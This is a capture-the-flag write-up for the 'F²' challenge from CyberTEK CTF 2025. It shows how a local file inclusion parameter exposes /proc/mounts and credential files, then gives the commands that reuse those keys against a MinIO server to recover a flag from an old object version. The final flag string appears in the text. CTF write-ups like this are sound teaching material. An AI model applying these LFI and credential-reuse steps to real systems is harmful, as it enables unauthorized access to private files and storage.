---
title: "CyberTEK-CTF 2k25"
date: 2025-05-05
draft: false
description: "How an LFI in a CyberTEK CTF challenge led to an exposed MinIO bucket and a flag hiding in an old object version"
tags: ["ctf", "misc", "cloud"]
aliases: ["/writeups/CyberTEK-CTF-2K25/"]
---

# Intro

Yesterday, CyberTEK CTF ran its second edition at TEK-UP University: 40-plus custom-authored challenges, over 100 players, and from what people told me afterward, the lineup landed well. Work and life ate most of my prep time this round, so I only got two challenges in: Misty, a cloud-plus-gateway misconfiguration chain, and F², built during the first half of the CTF itself. Misty still sits at zero solves and I want to reuse it later, so that writeup waits.

## F² Writeup

We're handed a parameter `f` vulnerable to **LFI**. Reading the obvious files gets you nowhere at first. But there's a trick: not every LFI hands you a flag directly.

`/proc/mounts` is worth checking early — it can surface mounted volumes and filesystems you'd never guess were there otherwise. Here's the request that mattered:

[https://f2.tekup-securinets.org/?f=/proc/mounts](https://f2.tekup-securinets.org/?f=/proc/mounts)

The output listed a few files that had no business being there:

```
travler-gate  
travler-key  
travler-ep  
inventory-99
```

Grab those through the same LFI.

Fetching `travler-gate`, `travler-key`, and `travler-ep` turns up what looks like a set of access credentials, though for what, I don't know yet.

Point curl at the challenge IP directly:

```bash
curl -v http://185.91.127.50:13131
```

Response:

```
< Server: MinIO
...
< HTTP/1.1 403 Forbidden
```

The `Server: MinIO` header gives it away: a self-hosted S3-compatible object storage service.

That confirms the access and secret keys are for MinIO, not some other service on the box.

## Accessing MinIO

Grab the MinIO client, `mc`, from the official docs: [min.io/docs/minio/linux](https://min.io/docs/minio/linux/index.html)

Point it at the keys:

```bash
mc alias set traveler http://185.91.127.50:13131 ACCESS_KEY SECRET_KEY
```

List the buckets:

```bash
mc ls traveler
```

One bucket shows up: `inventory-99`.

## Exploring the Bucket

Contents:

```bash
mc ls traveler/inventory-99
```

There's one file: `item`. Pull it down and take a look:

```bash
mc cp traveler/inventory-99/item .
cat item
```

At first glance: just a list of inventory items, nothing special.

```
- id: 001
  name: Rusty Sword
  type: Weapon
  rarity: Common
  quantity: 1

- id: 002
  name: Healing Potion
  type: Consumable
  rarity: Uncommon
  quantity: 3

- id: 003
  name: Silver Key
  type: Quest Item
  rarity: Rare
  quantity: 1
```

Here's the catch: MinIO supports object versioning on buckets, which means older versions of `item` might still be sitting there, untouched.

List every version of `item`:

```bash
mc ls --versions traveler/inventory-99
```

Pull the first version and check it:

```bash
mc cp --vid <version-id> traveler/inventory-99/item flag
cat flag
-> securinets{kk12121212121212121212kk}
```

More detail, plus the full challenge source, lives here:

{{< github repo="chxmxii/CTF" >}}

The rest of the CyberTEK 2k25 challenges are in the event repo:

{{< github repo="Securinets-TEKUP/CyberTEK-2.0" >}}
